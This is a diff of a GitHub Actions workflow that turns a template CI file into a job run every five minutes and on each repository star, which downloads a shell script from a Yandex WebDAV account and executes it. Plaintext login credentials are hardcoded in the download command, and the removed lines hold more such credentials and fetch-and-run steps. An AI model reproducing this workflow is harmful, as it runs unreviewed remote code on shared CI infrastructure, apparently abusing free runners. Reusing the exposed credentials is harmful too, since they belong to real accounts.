@@ -1,72 +1,27 @@
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the workflow will run
+name: 2843_gitaction
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
-  push:
+  #push:
     #branches: [ "main" ]
   #pull_request:
     #branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-  #https://crontab.guru/，生成定时时间网站
+  #workflow_dispatch:
+  watch:
+    types: started
   schedule:
-  # 定时任务，在每天的5点推送天气信息到邮箱
-    - cron: "1 * * * *"
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+  # 定时任务，每分钟运行
+    - cron: "*/5 * * * *"
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
-    steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      #- uses: actions/checkout@v3
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-            # 步骤，这里只写了一个步骤，${GITHUB_WORKSPACE}，${{github.workspace}}/../.github/workspace， /./bbb.sh
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
-          #echo  pwd  && cd .. &&   cd .. &&     cd .. &&   ls    
-          #cd   ${GITHUB_WORKSPACE}
-          #cd   ${{github.workspace}}
-          #cd  ..
-          # mkdir  folderaaa
-          #cd  /home/runneradmin
+ build:
+   runs-on: ubuntu-latest
+   steps:
+     - name: Run a multi-line script
+       run: |
+          echo 啊啊啊
+          bashname=2843_gitaction.sh
+          curl   -O     -u wuniu5@yandex.com:jbirsojyfbgnfboe      https://webdav.yandex.ru/my/$bashname
           ls
-          # for i in {0..20}; {      curl  -s  http://gongzige.42web.io//tongji.php   ;};          
-          shellname=git2843.sh
-          #rm aaa.sh
-          #curl  -O  https://raw.githubusercontent.com/erbasisan/foder/main/aaa.sh
-          #curl    -O  -u  502112076@qq.com:ax4mgtbia55quvag      http://dav.jianguoyun.com/dav/my/aaa.sh
-          #curl   -O     -u wuniu5@yandex.com:jbirsojyfbgnfboe      https://webdav.yandex.ru/my/$shellname
-          #cat  $shellname
-          ls
-          #echo  下载成功
-          #chmod   777  $shellname
-          #sed -i 's/\r//'   $shellname
-          #bash ./aaa.sh
+          chmod   777    $bashname
+          sed -i 's/\r//'     $bashname
+          bash ./$bashname
           echo  运行完毕
           ls
-          #echo    $xxx>a.txt
-          curl    https://sanliuyi100alist2843.herokuapp.com/
-          curl    https://sanliuyi101alistsuishi1.herokuapp.com
-          
-
-
-
-
-
-
